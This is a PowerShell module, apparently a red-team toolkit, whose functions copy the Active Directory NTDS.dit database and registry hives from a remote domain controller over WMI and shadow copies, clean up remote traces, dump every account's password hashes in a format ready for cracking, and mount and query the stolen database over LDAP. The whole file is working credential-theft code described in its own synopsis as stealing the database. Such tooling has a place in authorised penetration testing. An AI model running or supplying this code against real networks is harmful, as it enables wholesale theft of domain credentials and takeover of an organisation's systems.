function Get-NtdsDatabase {
<#
.SYNOPSIS
    Steal Active Directory database remotely.

    Author: Timothee MENOCHET (@TiM0)

.DESCRIPTION
    Get-NtdsDatabase makes a copy of the NTDS.dit file and related hives from a remote domain controller.
    The ntdsutil command is launch through WMI in case of Windows 2008 or later, otherwise WMI Volume Shadow Copy method is used.

.PARAMETER DomainController
    Specifies the target domain controller.

.PARAMETER TargetDirectory
    Specifies the target directory for local copy.

.PARAMETER Credential
    Specifies the privileged account to use (typically Domain Admin).

.EXAMPLE
    PS C:\> Get-NtdsDatabase -DomainController DC.ADATUM.CORP

.EXAMPLE
    PS C:\> Get-NtdsDatabase -DomainController DC.ADATUM.CORP -TargetDirectory C:\Windows\Temp -Credential ADATUM\Administrator
#>

	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[String]
		$DomainController = $env:LOGONSERVER,

		[ValidateNotNullOrEmpty()]
		[String]
		$TargetDirectory = ".",

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty
	)

	# Identify the operating system version
	Write-Host "[*] Identifying the operating system version of $DomainController"
	Try {
		$OS = Get-WmiObject Win32_OperatingSystem -ComputerName $DomainController -Credential $Credential
	} Catch {
		Write-Warning $_
		Exit 1
	}

	# Map a drive to the domain controller and create a temporary directory
	New-PSDrive -Name "S" -Root "\\$DomainController\c$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
	New-Item -Path 'S:\Windows\Temp\dump' -ItemType directory | Out-Null

	# If the operating system is Windows 2008 or later
	If ($OS.Version[0] -ge 6) {
		Write-Host "[*] Creating NTDS copy using ntdsutil"
		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList 'cmd.exe /c ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\dump" "quit" "quit"' -ComputerName $DomainController -Credential $Credential
		Do {
			Start-Sleep -m 250
		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $DomainController -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)

		# Copy the ntds.dit file and registry hives locally
		Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
		Copy-Item 'S:\Windows\Temp\dump\Active Directory\ntds.dit' $TargetDirectory
		Copy-Item 'S:\Windows\Temp\dump\registry\SECURITY' $TargetDirectory
		Copy-Item 'S:\Windows\Temp\dump\registry\SYSTEM' $TargetDirectory
	}

	# If the operating system is Windows 2003
	Else {
		# Grab the location of the ntds.dit file on the remote domain controller
		$Hive = [uint32]2147483650
		$Key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
		$Value = "DSA Database File"
		$DitPath = (Invoke-WmiMethod -Class StdRegProv -Name GetStringValue -ArgumentList $Hive, $Key, $Value -ComputerName $DomainController -Credential $Credential).sValue
		$DitDrive = $DitPath.Split("\")[0]
		$DitRelativePath = $DitPath.Split("\")[1..($DitPath.Split("\").Length - 2)] -Join "\"

		# Create a shadow copy of the corresponding drive
		Write-Host "[*] Creating a shadow copy"
		$Process = Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'ClientAccessible',"$DitDrive\" -ComputerName $DomainController -Credential $Credential
		$ShadowCopy = Get-WmiObject -Class Win32_ShadowCopy -Property DeviceObject -Filter "ID = '$($Process.ShadowID)'" -ComputerName $DomainController -Credential $Credential
		$DeviceObject = $ShadowCopy.DeviceObject.ToString()

		# Copy the ntds.dit file and SYSTEM hive from the shadow copy
		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "cmd.exe /c for %I in ($DeviceObject\$DitRelativePath\ntds.dit $DeviceObject\$DitRelativePath\edb.log $DeviceObject\Windows\System32\config\SYSTEM $DeviceObject\Windows\System32\config\SECURITY) do copy %I C:\Windows\Temp\dump" -ComputerName $DomainController -Credential $Credential
		Do {
			Start-Sleep -m 250
		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $DomainController -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)

		# Delete the shadow copy
		(Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy -ComputerName $DomainController -Credential $Credential | Where-Object {$_.DeviceObject -eq $DeviceObject}).Delete()

		# Copy the ntds.dit file and registry hives locally
		Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
		Copy-Item 'S:\Windows\Temp\dump\ntds.dit' $TargetDirectory
		Copy-Item 'S:\Windows\Temp\dump\edb.log' $TargetDirectory
		Copy-Item 'S:\Windows\Temp\dump\SYSTEM' $TargetDirectory
		Copy-Item 'S:\Windows\Temp\dump\SECURITY' $TargetDirectory
	}

	# Delete the temporary directory
	Write-Host "[*] Cleaning up remote temporary files"
	Remove-Item 'S:\Windows\Temp\dump' -Recurse
	Remove-PSDrive S
}

function Dump-NtdsDatabase {
<#
.SYNOPSIS
    Dump domain accounts from an Active Directory database.

    Author: Timothee MENOCHET (@TiM0)

.DESCRIPTION
    Dump-NtdsDatabase extracts domain accounts from NTDS database and SYSTEM hive files, including password hashes.
	By default, all account objects are returned.

.NOTES
    DSInternals powershell module must be installed first:
	PS C:\> Install-Module -Name DSInternals

.PARAMETER SystemHiveFilePath
    Specifies the path to an offline SYSTEM registry hive.

.PARAMETER DatabasePath
	Specifies the path to an offline NTDS database.

.PARAMETER SamAccountName
    Specifies the identifier of an account that will be retrieved from the database.
	By default, all domain accounts will be retrieved.

.EXAMPLE
    PS C:\> Dump-NtdsDatabase | Format-Custom -View HashcatNT

.EXAMPLE
    PS C:\> Dump-NtdsDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName Administrator
#>
	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$DatabasePath = ".\ntds.dit",

		[ValidateNotNullOrEmpty()]
		[String]
		$SystemHiveFilePath = ".\SYSTEM",

		[ValidateNotNullOrEmpty()]
		[String]
		$SamAccountName
	)

	# Check if DSInternals module is installed
	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed"
		Exit 1
	} Else {
		Import-Module DSInternals
	}

	# Check if user is elevated
	$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
	If($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
		Write-Warning "This command must be launched as an Administrator" 
		Exit 1
    }

	# Read the Boot Key from the SYSTEM registry hive
	$key = Get-BootKey -SystemHiveFilePath "$SystemHiveFilePath"

	# Read one or more accounts from the ntds.dit file
	If ($SamAccountName) {
		Get-ADDBAccount -SamAccountName "$SamAccountName" -DatabasePath "$DatabasePath" -BootKey $key
	} Else {
		Get-ADDBAccount -All -DatabasePath "$DatabasePath" -BootKey $key
	}
}

function Mount-NtdsDatabase {
<#
.SYNOPSIS
    Mount an Active Directory database locally.

    Author: Timothee MENOCHET (@TiM0)

.DESCRIPTION
	Mount-NtdsDatabase exposes a NTDS database file as a Lightweight Directory Access Protocol (LDAP) server using DSAMain.exe.
	Database can then be queried using Invoke-LdapSearch or PowerView.

.NOTES
	Local administrative privileges are required.
	Moreover, Active Directory Lightweight Directory Services (AD LDS) must be installed first:
	# Windows Server
	PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM" -Online
	# Windows Workstation
	PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM-Client" -Online

.PARAMETER DatabasePath
    Specifies the path to the database file.

.PARAMETER AllowUpgrade
    Allows NTDS.dit upgrade, which is required to mount a database file from an earlier version of Windows (default: false).

.PARAMETER LdapPort
    Specifies the listening port for the LDAP service.

.EXAMPLE
    PS C:\> Mount-NtdsDatabase

.EXAMPLE
    PS C:\> Mount-NtdsDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade 1 -LdapPort 1389
#>
	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$DatabasePath = ".\ntds.dit",

		[switch]
		$AllowUpgrade = $false,

		[ValidateRange(1025,65535)]
		[int]
		$LdapPort = 3266
	)

	# Check if dsamain.exe is in the PATH
	If ((Get-Command dsamain.exe -ErrorAction SilentlyContinue) -eq $null) {
		Write-Warning "This command must be launched on a computer with AD LDS installed"
		Exit 1
	}

	# Check if user is elevated
	$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
	If($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
		Write-Warning "This command must be launched as an Administrator" 
		Exit 1
    }

	Write-Host "[*] Mounting NTDS database as a LDAP server"
	If ($AllowUpgrade) {
		$Options = '-allowNonAdminAccess -allowUpgrade'
	} Else {
		$Options = '-allowNonAdminAccess'
	}
	$DSAMain = Start-Process -FilePath dsamain.exe -ArgumentList "-dbpath $DatabasePath -ldapPort $LdapPort $Options" -PassThru -WindowStyle 1
	Start-Sleep -Seconds 3
	If (-Not(Get-Process dsamain -ErrorAction SilentlyContinue)) {
		Write-Warning "An error occured, retry with another port for LDAP server. If the error persist, please try the option 'AllowUpgrade' after backing up the database file"
	} ElseIf (-Not((Test-NetConnection -ComputerName localhost -Port $LdapPort -ErrorAction SilentlyContinue).TcpTestSucceeded)) {
		Write-Warning "An error occured, retry with option 'AllowUpgrade' after backing up the database file"
		Umount-NtdsDatabase
	} Else {
		Write-Host "[*] LDAP server listening on port $LdapPort"
	}
}

function Umount-NtdsDatabase {
	Get-Process dsamain -ErrorAction SilentlyContinue | Stop-Process
}

function Invoke-LdapSearch {
<#
.SYNOPSIS
    Search for domain objects in Active Directory.

    Author: Timothee MENOCHET (@TiM0)

.DESCRIPTION
	Invoke-LdapSearch builds a directory searcher object using ADSI and searches for objects matching a custom LDAP filter.
	By default, all account objects for the target directory are returned.
	Uses LDAP protocol for compatibility with NTDS databases exposed through Mount-NtdsDatabase.

.PARAMETER Server
    Specifies the target directory server.

.PARAMETER Configuration
	Rather than searching in the default path, switches to the configuration naming context.

.PARAMETER LdapFilter
    Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties
    Specifies the properties of the output object to retrieve from the server.

.EXAMPLE
    PS C:\> Invoke-LdapSearch -Server localhost:1389 -LdapFilter "(objectClass=person)" -Properties sAMAccountName
#>
	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$Server = "localhost:3266",

        [switch]
        $Configuration,

		[ValidateNotNullOrEmpty()]
		[String]
		$LdapFilter = "(objectClass=user)",

		[ValidateNotNullOrEmpty()]
		[String[]]
		$Properties = "*"
	)

	$BaseURI = "LDAP://" + $Server
	$BaseDN = (New-Object System.DirectoryServices.DirectoryEntry($BaseURI + "/RootDSE")).defaultNamingContext
	If ($Configuration) {
		$SearchString = $SearchString = $BaseURI + "/" + "CN=Configuration," + $BaseDN
	} Else {
		$SearchString = $SearchString = $BaseURI + "/" + $BaseDN
	}
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$Searcher.Filter = $LdapFilter
	$PropertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
	$Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
	Try {
		$Results = $Searcher.FindAll()
		$Results | Where-Object {$_} | ForEach-Object {
			$ObjectProperties = @{}
			$p = $_.Properties
			$p.PropertyNames | ForEach-Object {
				If (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
					$ObjectProperties[$_] = $p[$_][0]
				} ElseIf ($_ -ne 'adspath') {
					$ObjectProperties[$_] = $p[$_]
				}
			}
			New-Object -TypeName PSObject -Property ($ObjectProperties)
		}
		$Results.dispose()
		$Searcher.dispose()
	} Catch {
		Write-Warning "$_"
	}
}